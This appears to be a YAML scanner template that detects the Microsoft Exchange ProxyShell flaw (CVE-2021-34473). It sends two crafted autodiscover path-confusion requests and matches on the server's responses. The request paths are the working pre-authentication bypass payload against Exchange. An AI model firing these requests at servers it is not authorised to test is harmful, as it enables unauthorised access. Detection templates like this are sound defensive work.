name: yaml-poc-microsoft-exchange_server-logical-CVE-2021-34473
binding: 5fbc849c-a7a2-4691-96a4-647d4445a66a
detail:
    author: jiapeng.han
    links:
        - http://packetstormsecurity.com/files/163895/Microsoft-Exchange-ProxyShell-Remote-Code-Execution.html
        - https://help.aliyun.com/noticelist/articleid/1060886526.html
        - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473
        - https://nvd.nist.gov/vuln/detail/CVE-2021-34473
        - https://packetstormsecurity.com/files/163895/Microsoft-Exchange-ProxyShell-Remote-Code-Execution.html
        - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-34473
        - https://vigilance.fr/vulnerability/Microsoft-Exchange-Server-vulnerabilities-of-July-2021-35886
        - https://www.cybersecurity-help.cz/vdb/SB2021071319
        - https://www.zerodayinitiative.com/advisories/ZDI-21-821/
    vulnerability:
        id: 5bd4d6db-ba6a-4cf2-a29f-18f31d751ce7
        level: critical
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com
            follow_redirects: false
        expression: response.status >= 300 && response.status < 400 && response.body_string.contains("Microsoft.Exchange.Clients.Owa2.Server.Core.OwaADUserNotFoundException")
    r1:
        request:
            cache: true
            method: GET
            path: /autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com
            headers:
                Accept: '*/*'
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("Exchange MAPI/HTTP Connectivity Endpoint")
expression: r0() && r1()
